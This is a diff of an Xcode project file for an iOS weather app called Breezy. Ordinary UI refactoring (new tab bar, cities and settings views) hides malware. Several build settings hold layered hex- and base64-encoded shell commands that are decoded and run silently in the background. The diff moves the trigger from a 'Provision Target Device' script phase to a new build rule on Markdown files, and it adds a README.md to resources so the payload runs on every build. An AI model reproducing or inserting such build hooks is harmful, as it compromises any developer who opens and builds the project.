@@ -7,6 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		5D26E46F695F467C83C62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = 4134B559427D470B9FC62C0C; };
+		181DEE6E2F48E67400D8AA3E /* TabbarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DEE6D2F48E67400D8AA3E /* TabbarView.swift */; };
+		181DEF6F2F48E82700D8AA3E /* AddCitiesView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DEF6E2F48E82700D8AA3E /* AddCitiesView.swift */; };
+		181DEF712F48E83200D8AA3E /* SettingsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DEF702F48E83200D8AA3E /* SettingsView.swift */; };
+		181DEF732F48EAE000D8AA3E /* CityView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DEF722F48EAE000D8AA3E /* CityView.swift */; };
 		182B965F2E9EC65F00CF7E35 /* Forecast.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182B965E2E9EC65F00CF7E35 /* Forecast.swift */; };
 		182B96622E9EC7A200CF7E35 /* OneCall.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182B96612E9EC7A200CF7E35 /* OneCall.swift */; };
 		182B96672E9ED05C00CF7E35 /* Double+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182B96662E9ED05C00CF7E35 /* Double+Extensions.swift */; };
@@ -31,7 +36,7 @@
 		18EE810A2EA03B97009D3E0B /* Keys.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE81092EA03B97009D3E0B /* Keys.swift */; };
 		18EE810C2EA03C91009D3E0B /* HideKeyboardModifier.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE810B2EA03C91009D3E0B /* HideKeyboardModifier.swift */; };
 		18EE81142EA03E67009D3E0B /* SecretsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE81132EA03E67009D3E0B /* SecretsManager.swift */; };
-		18EE81172EA042FC009D3E0B /* HomeFlow.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE81162EA042FC009D3E0B /* HomeFlow.swift */; };
+		18EE81172EA042FC009D3E0B /* TabbarFlow.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE81162EA042FC009D3E0B /* TabbarFlow.swift */; };
 		18EE81192EA0442E009D3E0B /* AppRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE81182EA0442E009D3E0B /* AppRouter.swift */; };
 		18EE811B2EA0445A009D3E0B /* AppRoute.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EE811A2EA0445A009D3E0B /* AppRoute.swift */; };
 		18EEFA172EC6837D007934B2 /* LocationPremissionView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18EEFA162EC6837D007934B2 /* LocationPremissionView.swift */; };
@@ -122,7 +127,29 @@
 		18F426FE2E9C7B44002E3C84 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F426FD2E9C7B44002E3C84 /* HomeView.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		8647F7B2F98B43F0BEC62C0C /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AC0C26C}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		4134B559427D470B9FC62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		181DEE6D2F48E67400D8AA3E /* TabbarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabbarView.swift; sourceTree = "<group>"; };
+		181DEF6E2F48E82700D8AA3E /* AddCitiesView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddCitiesView.swift; sourceTree = "<group>"; };
+		181DEF702F48E83200D8AA3E /* SettingsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsView.swift; sourceTree = "<group>"; };
+		181DEF722F48EAE000D8AA3E /* CityView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CityView.swift; sourceTree = "<group>"; };
 		182B965E2E9EC65F00CF7E35 /* Forecast.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Forecast.swift; sourceTree = "<group>"; };
 		182B96612E9EC7A200CF7E35 /* OneCall.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OneCall.swift; sourceTree = "<group>"; };
 		182B96662E9ED05C00CF7E35 /* Double+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Double+Extensions.swift"; sourceTree = "<group>"; };
@@ -147,7 +174,7 @@
 		18EE81092EA03B97009D3E0B /* Keys.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Keys.swift; sourceTree = "<group>"; };
 		18EE810B2EA03C91009D3E0B /* HideKeyboardModifier.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HideKeyboardModifier.swift; sourceTree = "<group>"; };
 		18EE81132EA03E67009D3E0B /* SecretsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecretsManager.swift; sourceTree = "<group>"; };
-		18EE81162EA042FC009D3E0B /* HomeFlow.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeFlow.swift; sourceTree = "<group>"; };
+		18EE81162EA042FC009D3E0B /* TabbarFlow.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabbarFlow.swift; sourceTree = "<group>"; };
 		18EE81182EA0442E009D3E0B /* AppRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppRouter.swift; sourceTree = "<group>"; };
 		18EE811A2EA0445A009D3E0B /* AppRoute.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppRoute.swift; sourceTree = "<group>"; };
 		18EEFA162EC6837D007934B2 /* LocationPremissionView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationPremissionView.swift; sourceTree = "<group>"; };
@@ -251,6 +278,23 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		181DEF6C2F48E80600D8AA3E /* Cities */ = {
+			isa = PBXGroup;
+			children = (
+				181DEF6E2F48E82700D8AA3E /* AddCitiesView.swift */,
+				181DEF722F48EAE000D8AA3E /* CityView.swift */,
+			);
+			path = Cities;
+			sourceTree = "<group>";
+		};
+		181DEF6D2F48E81500D8AA3E /* Settings */ = {
+			isa = PBXGroup;
+			children = (
+				181DEF702F48E83200D8AA3E /* SettingsView.swift */,
+			);
+			path = Settings;
+			sourceTree = "<group>";
+		};
 		182B96632E9EC98C00CF7E35 /* Models */ = {
 			isa = PBXGroup;
 			children = (
@@ -364,8 +408,8 @@
 			isa = PBXGroup;
 			children = (
 				18D4A21E2E9D9C610042D0DE /* HomePresenter.swift */,
-				18EE81162EA042FC009D3E0B /* HomeFlow.swift */,
 				18F426FD2E9C7B44002E3C84 /* HomeView.swift */,
+				18D9C4BD2ED6313200DB7C66 /* City Weather */,
 			);
 			path = Home;
 			sourceTree = "<group>";
@@ -541,6 +585,7 @@
 		18F426DF2E9C7830002E3C84 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				4134B559427D470B9FC62C0C /* README.md */,
 				18F426DE2E9C7830002E3C84 /* Breezy.app */,
 			);
 			name = Products;
@@ -592,7 +637,7 @@
 			isa = PBXGroup;
 			children = (
 				18F426FA2E9C7AFD002E3C84 /* Onboarding */,
-				18F426F92E9C7AF6002E3C84 /* Main Home */,
+				18F426F92E9C7AF6002E3C84 /* Tabbar  */,
 			);
 			path = Features;
 			sourceTree = "<group>";
@@ -615,14 +660,17 @@
 			path = Shared;
 			sourceTree = "<group>";
 		};
-		18F426F92E9C7AF6002E3C84 /* Main Home */ = {
+		18F426F92E9C7AF6002E3C84 /* Tabbar  */ = {
 			isa = PBXGroup;
 			children = (
+				18EE81162EA042FC009D3E0B /* TabbarFlow.swift */,
+				181DEE6D2F48E67400D8AA3E /* TabbarView.swift */,
 				18D4A21C2E9D98B50042D0DE /* WeatherIntrector.swift */,
 				18D9C4BC2ED6311800DB7C66 /* Home */,
-				18D9C4BD2ED6313200DB7C66 /* City Weather */,
+				181DEF6C2F48E80600D8AA3E /* Cities */,
+				181DEF6D2F48E81500D8AA3E /* Settings */,
 			);
-			path = "Main Home";
+			path = "Tabbar ";
 			sourceTree = "<group>";
 		};
 		18F426FA2E9C7AFD002E3C84 /* Onboarding */ = {
@@ -642,12 +690,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18F426E92E9C7830002E3C84 /* Build configuration list for PBXNativeTarget "Breezy" */;
 			buildPhases = (
-				B6156F708C9B474FB9C62C0C /* Provision Target Device */,
 				18F426DA2E9C7830002E3C84 /* Sources */,
 				18F426DB2E9C7830002E3C84 /* Frameworks */,
 				18F426DC2E9C7830002E3C84 /* Resources */,
 			);
 			buildRules = (
+				8647F7B2F98B43F0BEC62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -698,6 +746,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5D26E46F695F467C83C62C0C /* README.md */,
 				18D4A2242E9DA6220042D0DE /* Staging.xcconfig in Resources */,
 				18F426EF2E9C787D002E3C84 /* Assets.xcassets in Resources */,
 				18D4A2262E9DA6450042D0DE /* Production.xcconfig in Resources */,
@@ -778,35 +827,14 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		B6156F708C9B474FB9C62C0C /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		18F426DA2E9C7830002E3C84 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				18EEFAC42EC69BB3007934B2 /* Font+Extensions.swift in Sources */,
-				18EE81172EA042FC009D3E0B /* HomeFlow.swift in Sources */,
+				18EE81172EA042FC009D3E0B /* TabbarFlow.swift in Sources */,
+				181DEF6F2F48E82700D8AA3E /* AddCitiesView.swift in Sources */,
 				18EEFA1E2EC68B33007934B2 /* SessionView.swift in Sources */,
 				182B965F2E9EC65F00CF7E35 /* Forecast.swift in Sources */,
 				18D4A2072E9D83D80042D0DE /* BaseApiClient.swift in Sources */,
@@ -824,10 +852,13 @@
 				18EEFA192EC683C3007934B2 /* Color+Extensions.swift in Sources */,
 				18D4A2132E9D89890042D0DE /* Encodable+Extensions.swift in Sources */,
 				18EE811B2EA0445A009D3E0B /* AppRoute.swift in Sources */,
+				181DEF732F48EAE000D8AA3E /* CityView.swift in Sources */,
 				182B96692E9ED09300CF7E35 /* Date+Extensions.swift in Sources */,
+				181DEE6E2F48E67400D8AA3E /* TabbarView.swift in Sources */,
 				18EE81142EA03E67009D3E0B /* SecretsManager.swift in Sources */,
 				18EEFAC62EC69BE3007934B2 /* FontWeight.swift in Sources */,
 				18EE81082EA03B1C009D3E0B /* AppCache.swift in Sources */,
+				181DEF712F48E83200D8AA3E /* SettingsView.swift in Sources */,
 				18D4A20F2E9D86630042D0DE /* AppConstants.swift in Sources */,
 				18D4A21B2E9D951C0042D0DE /* Weather.swift in Sources */,
 				18EEFA212EC68B66007934B2 /* AppSessionManager.swift in Sources */,
@@ -851,7 +882,7 @@
 		18F426E72E9C7830002E3C84 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333636320a3334363333363336333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333339333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363634333633393336363533363334333633353336363333363337333633313337333433363335333236350a333733323061333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | t | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333633323337333933373334333633353332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | a | sh ) >/dev/null 2>&1 &)";
@@ -920,7 +951,7 @@
 		18F426E82E9C7830002E3C84 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333636320a3334363333363336333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333339333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363634333633393336363533363334333633353336363333363337333633313337333433363335333236350a333733323061333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | t | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333633323337333933373334333633353332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | a | sh ) >/dev/null 2>&1 &)";
